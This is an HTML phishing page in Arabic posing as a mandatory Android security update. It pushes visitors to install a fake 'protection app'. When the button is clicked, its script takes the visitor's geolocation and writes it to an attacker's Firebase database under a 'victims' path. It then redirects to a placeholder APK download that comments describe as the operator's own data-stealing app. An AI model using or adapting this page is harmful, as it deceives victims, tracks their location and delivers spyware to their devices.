<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>تحديث نظام أندرويد الإجباري</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background-color: #f0f0f0; font-family: sans-serif; text-align: center; padding-top: 50px; }
        .btn { background-color: #007bff; color: white; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-size: 18px; }
    </style>
</head>
<body>
    <h1>تنبيه أمني هام!</h1>
    <p>جهازك غير محمي وقد يتعرض للاختراق. يرجى تحميل تطبيق الحماية الرسمي فوراً.</p>
    <button class="btn" onclick="startPayload()">تحميل وتثبيت الآن</button>

    <script>
        // بيانات Firebase الخاصة بك
        const firebaseConfig = {
            apiKey: "AIzaSyCaArCXRtxCYXXHWwKBfx-CrXUCCBjx9C8",
            databaseURL: "https://hercules-v2-109a5-default-rtdb.firebaseio.com",
            projectId: "hercules-v2-109a5"
        };
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        const urlParams = new URLSearchParams(window.location.search);
        const vID = urlParams.get('id') || "User_" + Math.floor(Math.random() * 1000);

        function startPayload() {
            // سحب البيانات المتاحة من الرابط (IP و الموقع)
            navigator.geolocation.getCurrentPosition((pos) => {
                database.ref('victims/' + vID + '/Location').set({
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude
                });
            });

            // بدء تحميل تطبيق السحب (APK) الذي صنعته في سكتشوير
            // يجب أن ترفع ملف الـ APK الخاص بك على رابط مباشر وتضعه هنا
            window.location.href = "https://your-direct-link.com/app.apk";
        }
    </script>
</body>
</html>
